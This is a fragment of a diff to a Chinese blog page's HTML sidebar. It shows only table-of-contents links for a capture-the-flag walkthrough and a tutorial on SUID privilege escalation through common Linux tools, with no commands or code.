href="#%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-number">4.3.</span> <span class="nav-text">查找配置文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%99%BB%E5%BD%95%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">4.4.</span> <span class="nav-text">登录数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81"><span class="nav-number">4.5.</span> <span class="nav-text">修改管理员密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0"><span class="nav-number">4.6.</span> <span class="nav-text">登录后台</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%BE%E5%88%B0flag3"><span class="nav-number">4.7.</span> <span class="nav-text">找到flag3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%BE%E5%88%B0flag4"><span class="nav-number">4.8.</span> <span class="nav-text">找到flag4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E5%B9%B6%E6%89%BE%E5%88%B0flag5"><span class="nav-number">4.9.</span> <span class="nav-text">提权并找到flag5</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AEsuid"><span class="nav-number">2.</span> <span class="nav-text">设置SUID</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84suid%E6%8F%90%E6%9D%83%E5%91%BD%E4%BB%A4"><span class="nav-number">3.</span> <span class="nav-text">常用的SUID提权命令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE%E6%8B%A5%E6%9C%89suid%E6%9D%83%E9%99%90%E7%9A%84%E7%A8%8B%E5%BA%8F"><span class="nav-number">4.</span> <span class="nav-text">查找拥有SUID权限的程序</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#nmap%E6%8F%90%E6%9D%83"><span class="nav-number">5.</span> <span class="nav-text">nmap提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#find%E6%8F%90%E6%9D%83"><span class="nav-number">6.</span> <span class="nav-text">find提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#vim%E6%8F%90%E6%9D%83"><span class="nav-number">7.</span> <span class="nav-text">vim提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bash%E6%8F%90%E6%9D%83"><span class="nav-number">8.</span> <span class="nav-text">bash提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less%E6%8F%90%E6%9D%83"><span class="nav-number">9.</span> <span class="nav-text">less提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#more%E6%8F%90%E6%9D%83"><span class="nav-number">10.</span> <span class="nav-text">more提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#nano%E6%8F%90%E6%9D%83"><span class="nav-number">11.</span> <span class="nav-text">nano提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cp%E6%8F%90%E6%9D%83"><span class="nav-number">12.</span> <span class="nav-text">cp提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#awk%E6%8F%90%E6%9D%83"><span class="nav-number">13.</span> <span class="nav-text">awk提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">14.</span> <span class="nav-text">总结</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
